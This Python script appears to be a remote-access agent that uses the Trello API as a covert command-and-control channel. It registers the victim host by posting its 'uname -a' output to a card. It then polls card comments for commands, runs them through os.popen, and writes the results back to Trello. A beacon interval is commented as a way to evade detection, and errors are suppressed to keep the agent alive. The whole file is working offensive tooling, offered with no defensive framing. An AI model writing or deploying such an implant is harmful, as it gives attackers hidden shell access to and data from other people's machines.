#!/usr/bin/env python3

import requests as req
import string
import random
import os
import time

TRELLO_IDLIST = "XXX"
TRELLO_APIKEY = "XXX"
TRELLO_APITOKEN = "XXX"
BEACON_INTERVAL =  # Create Interval For Evading Massive Detection Request
# Trello URL Format
def trello_urlformatting(url_request):
	API_URL = f"https://api.trello.com/1/{url_request}?key={TRELLO_APIKEY}&token={TRELLO_APITOKEN}"
	return API_URL

# Create Agent Card
def create_agent_card(card_name):
	random_string = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(5))
	param_paylod = {"name":card_name+ " - " + random_string,"idList":TRELLO_IDLIST}
	req_createcard = req.post(trello_urlformatting("cards"),params=param_paylod)
	res_createcard = req_createcard.json()
	return res_createcard

# Create Card Agent
res_createcard = create_agent_card(str(os.popen("uname -a").read()))
getid_card = res_createcard['id']
url_labels = trello_urlformatting(f"cards/{getid_card}/actions/comments")
post_label = {"text":f"executed:Connection Established"}
req.post(url_labels,data=post_label)

# Agent Communicate With Trello Cards 
while True:
	try:
		command_is_exist = False
		command = ""
	
		while not command_is_exist:
			time.sleep(BEACON_INTERVAL)
			url_labels = trello_urlformatting(f"cards/{getid_card}/actions")
			param_payload = {"filter":"commentCard"} 
			request_comment = req.get(url_labels,params=param_payload)
			res_json_requestcomment = request_comment.json()
			get_lasttext = res_json_requestcomment[0]['data']['text'] # Get Last Data Text
			if "pending_executed:" in get_lasttext:
				command = get_lasttext
				command_is_exist = True

		replace_prefix_command = command.replace("pending_executed:","")
		execute_commad = f"lntc_command_result:{os.popen(replace_prefix_command).read()}"
		param_desc = {"desc":execute_commad}
		request_purdesc = req.put(trello_urlformatting(f"cards/{getid_card}"),params=param_desc)
		replace_prefix = command.replace("pending_executed:","")
		param_updatecomment = {"id":getid_card,"idAction":res_json_requestcomment[0]['id'],"text":replace_prefix}
		req.put(trello_urlformatting(f"cards/{getid_card}/actions/{res_json_requestcomment[0]['id']}/comments"),params=param_updatecomment)
	except Exception as e:
		print(e) # Pass All Error to Keep Agent Active
		continue;
